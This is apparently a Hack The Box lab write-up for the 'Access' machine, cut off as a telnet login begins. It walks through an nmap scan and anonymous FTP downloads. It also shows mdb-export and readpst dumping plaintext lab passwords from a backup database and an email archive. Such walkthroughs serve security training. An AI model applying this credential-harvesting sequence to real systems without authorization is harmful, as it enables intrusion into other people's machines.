Access is an **easy** difficulty machine, that highlights how machines associated with the physical security of an environment may not themselves be secure. Also highlighted is how accessible FTP/file shares can often lead to getting a foothold or lateral movement. It teaches techniques for identifying and exploiting saved credentials.

## Reconnaissance

### Port scanning
I'll start by running an Nmap service and version scan with the default scripts. This will help identify any open ports and provide information about the services running on them, giving us valuable targets for further exploration.
> Always save the Nmap output in a text file for future reference. This practice is invaluable, as repeatedly running Nmap can be time-consuming and unnecessary.
{: .prompt-tip }

```shell
┌──(frodo㉿kali)-[~/hack-the-box/access]
└─$ nmap -sC -sV -p- -Pn  --min-rate 10000 -oA nmap_report 10.129.243.223

```
Revewing the `Nmap` report, we are able to find 3 interesting ports that we can try to get our foothold-

|Interesting Port | Service | Version |
|-----------------|---------|---------|
|21/tcp           |ftp      |Microsoft ftpd |
|23/tcp             |telnet | NA    |
|80/tcp         | http | Microsoft-IIS/7.5

### FTP Anonymous Access

Anonymous login is allowed on the target.

```shell
┌──(frodo㉿kali)-[~/hack-the-box/access]
└─$ ftp ftp://anonymous:''@10.129.243.223:21
Connected to 10.129.243.223.

331 Anonymous access allowed, send identity (e-mail name) as password.
230 User logged in.
Remote system type is Windows_NT.
200 Type set to I.
ftp> 
```
Inside the FTP, there were 2 folders found-
1. Backups
2. Engineer

Inside the Backups folder, we are able to find an access database file called **backup.mdb** and inside the `Engineer` folder, there is a `zip` file called **Access Control.zip**.

We are going to download both of these files locally to our attacker machine foro further analysis.

```shell
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |****************************************|  5520 KiB  857.28 KiB/s    00:00 ETA

```

```shell
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  12:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> get "Access Control.zip"
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
125 Data connection already open; Transfer starting.

226 Transfer complete.
10870 bytes received in 00:00 (33.09 KiB/s)
```

The zip file is password protected and we do not know the password yet, so we will start with the `backup.mdb` file, and for that, we need `mdbtools` installed on our attacker machine. 

```shell
sudo apt install mdbtools
```

> A `.mdb` file is a Microsoft Access database file that was the default file format for Access versions up to 2003. MDB stands for Microsoft Database. 
{: .prompt-info}

There are lots of tables inside the databases, and not everything looks interesting, so we are going to narrow down our focus to user tables.

```shell
┌──(frodo㉿kali)-[~/hack-the-box/access]
└─$ mdb-tables -1  backup.mdb |grep user   
auth_user
auth_user_groups
auth_user_user_permissions
userinfo_attarea
```

Out of all, `auth_user` looks the most interesting. Maybe it stores the user authentication information.

Exporting the data using `mdb-export`, we found the credentials for 4 users.

```shell
┌──(frodo㉿kali)-[~/hack-the-box/access]
└─$ mdb-export backup.mdb auth_user 
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```

Using the password for `engineer`, which is `access4u@security`, I was able to extract the zip file, and there was only 1 file found inside called `Access Control.pst`.

> A PST file, or Personal Storage Table file, is a proprietary file format used by Microsoft to store items like emails, contacts, and calendar events: 
{: .prompt-info}

To ead the emails inside of the `.pst` file, there are lots of options, but we are goign to go with a lighweight solution. `readpst` seems to be the best one. Let's install it.

```shell
sudo apt install readpst
```
We are able to find 2 email.

```shell
──(frodo㉿kali)-[~/hack-the-box/access]
└─$ readpst Access\ Control.pst   
Opening PST file and indexes...
Processing Folder "Deleted Items"
	"Access Control" - 2 items done, 0 items skipped.
```

Let's look at the email 

```shell
┌──(frodo㉿kali)-[~/hack-the-box/access]
└─$ cat Access\ Control.mbox

Hi there,

 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

 

Regards,

John
```

It looks like password for one of the accounts called `security` was changed to `4Cc3ssC0ntr0ller`.


## Telnet

Let's `telnet` to the target machine with the `security` credentials and try to get a shell.

```shell       
┌──(frodo㉿kali)-[~/hack-the-box/access]
└─$ telnet 10.129.243.223
Trying 10.129.243.223...
